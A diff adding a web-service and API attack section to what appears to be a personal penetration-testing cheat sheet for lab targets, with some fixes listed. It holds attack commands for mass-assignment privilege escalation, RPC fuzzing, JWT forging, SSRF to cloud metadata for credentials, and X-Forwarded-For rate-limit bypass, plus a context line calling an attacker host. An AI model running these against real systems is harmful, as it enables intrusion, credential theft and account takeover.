@@ -106,6 +106,28 @@ document('http://<attacker>/x.xml')                                # SSRF/XXE
 
 > SSRF and SSTI are the heavy hitters: SSRF → cloud creds (169.254.169.254) is a top real-world finding, and SSTI is near-always RCE once you ID the engine. Fingerprint the engine first (the `{{7*7}}` vs `${7*7}` test), then fire the matching payload.
 
+## Web service & API attacks (reference)
+APIs expose the same web vulns plus method/auth-specific ones. First enumerate endpoints and methods.
+```bash
+# discover endpoints / params
+gobuster dir -u http://t/api -w api_wordlist.txt ; python3 arjun.py -u http://t/api/x
+# REST verbs — test each for authz (IDOR/mass-assignment territory)
+curl -X GET  http://t/api/users
+curl -X PUT  -d '{"admin":true}' http://t/api/users/1     # privilege via mass assignment
+curl -X DELETE http://t/api/users/1
+# RPC method fuzzing
+wfuzz -z file,methods.txt -d '{"method":"FUZZ","params":{},"id":0}' http://t/   # JSON-RPC
+wfuzz -z file,methods.txt -d '<methodCall><methodName>FUZZ</methodName>...' http://t/RPC2   # XML-RPC
+# SOAP: grab the WSDL first
+wsdump.pl -o out.txt http://t/service?wsdl
+```
+- **JWT attacks** (`jwt_tool <JWT> -C`): alg:none, weak HMAC secret (crack it), `kid` injection, missing signature check → forge admin tokens.
+- **API-borne SSRF/XXE:** `?url=http://169.254.169.254/` (cloud creds), XML body with external entity → same as the web-attacks above.
+- **Rate-limit bypass:** rotate `X-Forwarded-For` (`ffuf ... -H "X-Forwarded-For: FUZZ"`) to defeat per-IP throttling on login/OTP.
+- **Fix:** authz on every endpoint+method, validate JWT signature+alg server-side, don't trust `X-Forwarded-For`, schema-validate input, rate-limit properly.
+
+> APIs fail the same ways (IDOR, mass assignment, SSRF, XXE) but with less UI to hide behind — the method (PUT/DELETE) and the auth token are the attack surface. JWT `alg:none` and object-level authz (BOLA/IDOR) are the top two API findings.
+
 ## My notes / lab output
 Filled in as I run these on lab targets.
 
